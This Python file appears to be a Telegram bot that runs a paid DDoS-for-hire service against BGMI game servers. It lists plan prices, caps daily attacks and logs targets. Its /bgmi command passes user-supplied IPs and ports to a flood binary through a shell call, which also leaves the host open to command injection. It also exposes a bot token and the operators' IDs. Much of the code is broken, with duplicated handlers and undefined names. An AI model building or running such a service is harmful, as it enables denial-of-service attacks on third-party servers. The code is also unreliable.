#bgmiddoserpython

import telebot
import subprocess
import datetime
import os
import os
import telebot
import logging
import asyncio
from datetime import datetime, timedelta, timezone
from datetime import datetime
now = datetime.now()


# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)


 
# Telegram bot token and channel ID
TOKEN = '7331564546:AAEPHleqZwvo0EVB3ubpKTueoQ4hfPEFoa4'  # Replace with your actual bot token
ADMIN_ID = [6353114118]  # Added new admin ID
CHANNEL_ID = '-1002181039657'  # Replace with your specific channel or group ID

# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Dictionary to track user attack counts, cooldowns, photo feedbacks, and bans
user_attacks = {}
user_cooldowns = {}
user_photos = {}  # Tracks whether a user has sent a photo as feedback
user_bans = {}  # Tracks user ban status and ban expiry time
reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=10))).replace(hour=0, minute=0, second=0, microsecond=0)

# Cooldown duration (in seconds)
COOLDOWN_DURATION = 0  # 5 minutes
BAN_DURATION = timedelta(minutes=1)  
DAILY_ATTACK_LIMIT = 50  # Daily attack limit per user

# List of user IDs exempted from cooldown, limits, and photo requirements
EXEMPTED_USERS = [6353114118, 6353114118]

# Track active attacks
active_attacks = 0  
MAX_ACTIVE_ATTACKS = 1  # Maximum number of running attacks

def reset_daily_counts():
    """Reset the daily attack counts and other data at 12 AM IST."""
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=10)))
    if ist_now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)

# Function to validate IP address
def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# Function to validate port number
def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

# Function to validate duration
def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0


@bot.message_handler(commands=['start'])
def welcome_start(message):

    user_name = message.from_user.first_name
    response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss..
Try To Run This Command : /help 
'''
    bot.reply_to(message, response)


# /status Command
@bot.message_handler(commands=['status'])
def check_status(message):
    user_id = message.from_user.id
    remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
    cooldown_end = user_cooldowns.get(user_id)
    cooldown_time = max(0, (cooldown_end - datetime.now()).seconds) if cooldown_end else 0
    minutes, seconds = divmod(cooldown_time, 60)  # Convert to minutes and seconds

    response = (
        "🛡️✨ *『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎 』* ✨🛡️\n\n"
        f"👤 *𝙐𝙨𝙚𝙧:* {message.from_user.first_name}\n"
        f"🎯 *𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 𝘼𝙩𝙩𝙖𝙘𝙠𝙨:* `{remaining_attacks}` ⚔️\n"
        f"⏳ *𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙏𝙞𝙢𝙚:* `{minutes} min {seconds} sec` 🕒\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🚀 *𝙆𝙀𝙀𝙋 𝙎𝙐𝙋𝙋𝙊𝙍𝙏𝙄𝙉𝙂 𝘼𝙉𝘿 𝙒𝙄𝙉 𝙏𝙃𝙀 𝘽𝘼𝙏𝙏𝙇𝙀!* ⚡"
    )
    bot.reply_to(message, response, parse_mode="Markdown")

    # /reset_TF Command
@bot.message_handler(commands=['reset'])
def reset_attack_limit(message):
    owner_id = 6353114118
    if message.from_user.id != owner_id:
        response = (
            "❌🚫 *ACCESS DENIED!* 🚫❌\n\n"
            "🔒 *𝘠𝘰𝘶 𝘥𝘰 𝘯𝘰𝘵 𝘩𝘢𝘷𝘦 𝘱𝘦𝘳𝘮𝘪𝘴𝘴𝘪𝘰𝘯 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥!* 🔒\n\n"
            "🚀 *𝘖𝘯𝘭𝘺 𝘵𝘩𝘦 𝘉𝘖𝘚𝘚 𝘤𝘢𝘯 𝘦𝘹𝘦𝘤𝘶𝘵𝘦 𝘵𝘩𝘪𝘴!* 💀"
        )
        bot.reply_to(message, response, parse_mode="Markdown")
        return
    
    user_attacks.clear()
    response = (
        "🔄🔥 *『 𝗦𝗬𝗦𝗧𝗘𝗠 𝗥𝗘𝗦𝗘𝗧 𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗘𝗗! 』* 🔥🔄\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "⚙️ *𝗔𝗟𝗟 𝗗𝗔𝗜𝗟𝗬 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗜𝗠𝗜𝗧𝗦 𝗛𝗔𝗩𝗘 𝗕𝗘𝗘𝗡 𝗥𝗘𝗦𝗘𝗧!* ⚙️\n\n"
        "🚀 *𝗨𝘀𝗲𝗿𝘀 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘀𝘁𝗮𝗿𝘁 𝗻𝗲𝘄 𝗮𝘁𝘁𝗮𝗰𝗸𝘀!* 🚀\n"
        "💀 *𝗣𝗿𝗲𝗽𝗮𝗿𝗲 𝗳𝗼𝗿 𝗗𝗢𝗠𝗜𝗡𝗔𝗧𝗜𝗢𝗡!* 💀\n"
        "━━━━━━━━━━━━━━━━━━━\n"
    )
    bot.reply_to(message, response, parse_mode="Markdown", disable_web_page_preview=True)

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_ID:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)

    
# /reset_TF Command
@bot.message_handler(commands=['reset'])
def reset_attack_limit(message):
    owner_id = 7209762563
    if message.from_user.id != owner_id:
        response = (
            "❌🚫 *ACCESS DENIED!* 🚫❌\n\n"
            "🔒 *𝘠𝘰𝘶 𝘥𝘰 𝘯𝘰𝘵 𝘩𝘢𝘷𝘦 𝘱𝘦𝘳𝘮𝘪𝘴𝘴𝘪𝘰𝘯 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥!* 🔒\n\n"
            "🚀 *𝘖𝘯𝘭𝘺 𝘵𝘩𝘦 𝘉𝘖𝘚𝘚 𝘤𝘢𝘯 𝘦𝘹𝘦𝘤𝘶𝘵𝘦 𝘵𝘩𝘪𝘴!* 💀"
        )
        bot.reply_to(message, response, parse_mode="Markdown")
        return
    
    user_attacks.clear()
    response = (
        "🔄🔥 *『 𝗦𝗬𝗦𝗧𝗘𝗠 𝗥𝗘𝗦𝗘𝗧 𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗘𝗗! 』* 🔥🔄\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "⚙️ *𝗔𝗟𝗟 𝗗𝗔𝗜𝗟𝗬 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗜𝗠𝗜𝗧𝗦 𝗛𝗔𝗩𝗘 𝗕𝗘𝗘𝗡 𝗥𝗘𝗦𝗘𝗧!* ⚙️\n\n"
        "🚀 *𝗨𝘀𝗲𝗿𝘀 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘀𝘁𝗮𝗿𝘁 𝗻𝗲𝘄 𝗮𝘁𝘁𝗮𝗰𝗸𝘀!* 🚀\n"
        "💀 *𝗣𝗿𝗲𝗽𝗮𝗿𝗲 𝗳𝗼𝗿 𝗗𝗢𝗠𝗜𝗡𝗔𝗧𝗜𝗢𝗡!* 💀\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "🔗 *𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬: ISAGI ⚡*"
    )
    bot.reply_to(message, response, parse_mode="Markdown", disable_web_page_preview=True)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_ID:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_ID:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ."
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_ID:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found "
        except FileNotFoundError:
            response = "No data found "
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_ID:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ."
                bot.reply_to(message, response)
        else:
            response = "No data found "
            bot.reply_to(message, response)
    else:
        response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
                response = "You Are On Cooldown . Please Wait 5min Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 300:
                response = "Error: Time interval must be less than 301."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./ISAGI {target} {port} {time} 900"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = " You Are Not Authorized To Use This Command ."

    bot.reply_to(message, response)
    
# /status Command
@bot.message_handler(commands=['status'])
def check_status(message):
    user_id = message.from_user.id
    remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
    cooldown_end = user_cooldowns.get(user_id)
    cooldown_time = max(0, (cooldown_end - datetime.now()).seconds) if cooldown_end else 0
    minutes, seconds = divmod(cooldown_time, 60)  # Convert to minutes and seconds

    response = (
        "🛡️✨ *『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎 』* ✨🛡️\n\n"
        f"👤 *𝙐𝙨𝙚𝙧:* {message.from_user.first_name}\n"
        f"🎯 *𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 𝘼𝙩𝙩𝙖𝙘𝙠𝙨:* `{remaining_attacks}` ⚔️\n"
        f"⏳ *𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙏𝙞𝙢𝙚:* `{minutes} min {seconds} sec` 🕒\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🚀 *𝙆𝙀𝙀𝙋 𝙎𝙐𝙋𝙋𝙊𝙍𝙏𝙄𝙉𝙂 𝘼𝙉𝘿 𝙒𝙄𝙉 𝙏𝙃𝙀 𝘽𝘼𝙏𝙏𝙇𝙀!* ⚡"
    )
    bot.reply_to(message, response, parse_mode="Markdown")
 
# Handler for photos (feedback)
FEEDBACK_CHANNEL_ID = "-1002364415379"
last_feedback_photo = {}

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    photo_id = message.photo[-1].file_id

    if last_feedback_photo.get(user_id) == photo_id:
        response = (
            "⚠️🚨 *『 𝗪𝗔𝗥𝗡𝗜𝗡𝗚: SAME 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞! 』* 🚨⚠️\n\n"
            "🛑 *𝖸𝖮𝖴 𝖧𝖠𝖵𝖤 𝖲𝖤𝖭𝖳 𝖳𝖧𝖨𝖲 𝖥𝖤𝖤𝖣𝖡𝖠𝖢𝖪 𝘽𝙀𝙁𝙊𝙍𝙀!* 🛑\n"
            "📩 *𝙋𝙇𝙀𝘼𝙎𝙀 𝘼𝙑𝙊𝙄𝘿 𝙍𝙀𝙎𝙀𝙉𝘿𝙄𝙉𝙂 𝙏𝙃𝙀 𝙎𝘼𝙈𝙀 𝙋𝙃𝙊𝙏𝙊.*\n\n"
            "✅ *𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙒𝙄𝙇𝙇 𝙎𝙏𝙄𝙇𝙇 𝘽𝙀 𝙎𝙀𝙉𝙏!*"
        )
        bot.reply_to(message, response)

    last_feedback_photo[user_id] = photo_id
    user_photos[user_id] = True

    response = (
        "✨『 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲 𝑺𝑼𝑪𝑪𝑬𝑺𝑺𝑭𝑼𝑳𝑳𝒀 𝑹𝑬𝑪𝑬𝑰𝑽𝑬𝑫! 』✨\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🏆\n"
        "📩 𝙏𝙃𝘼𝙉𝙆 𝙔𝙊𝙐 𝙁𝙊𝙍 𝙎𝙃𝘼𝙍𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!🎉\n"
        "━━━━━━━━━━━━━━━━━━━"
    )
    bot.reply_to(message, response)

    for ADMIN_ID in ADMIN_IDS:
        bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
        admin_response = (
            "🚀🔥 *『 𝑵𝑬𝑾 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲 𝑹𝑬𝑪𝑬𝑰𝑽𝑬𝑫! 』* 🔥🚀\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🛡️\n"
            f"🆔 *𝙐𝙨𝙚𝙧 𝙄𝘿:* `{user_id}`\n"
            "📸 *𝙏𝙃𝘼𝙉𝙆 𝙔𝙊𝙐 𝙁𝙊𝙍 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!!* ⬇️\n"
            "━━━━━━━━━━━━━━━━━━━"
        )
        bot.send_message(ADMIN_ID, admin_response)

    bot.forward_message(FEEDBACK_CHANNEL_ID, message.chat.id, message.message_id)
    channel_response = (
        "🌟🎖️ *『 𝑵𝑬𝑾 𝑷𝑼𝑩𝑳𝑰𝑪 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲! 』* 🎖️🌟\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🏆\n"
        f"🆔 *𝙐𝙨𝙚𝙧 𝙄𝘿:* `{user_id}`\n"
        "📸 *𝙐𝙎𝙀𝙍 𝙃𝘼𝙎 𝙎𝙃𝘼𝙍𝙀𝘿 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆.!* 🖼️\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "📢 *𝙆𝙀𝙀𝙋 𝙎𝙐𝙋𝙋𝙊𝙍𝙏𝙄𝙉𝙂 & 𝙎𝙃𝘼𝙍𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!* 💖"
    )
    bot.send_message(FEEDBACK_CHANNEL_ID, channel_response)

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " No Command Logs Found For You ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command ."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
💥 /bgmi : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /plan : Checkout Our Botnet Rates.
💥 /when : To see your status.
💥 /
🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):

    user_name = message.from_user.first_name
    response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
🤖Try To Run This Command : /help 
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip 🌟 :
-> Attack Time : 180 (S)
> After Attack Limit : 5 Min
-> Concurrents Attack : 3

Pr-ice List💸 :
Day-->100 Rs
Week-->400 Rs
Month-->800 Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_ID:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)




#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
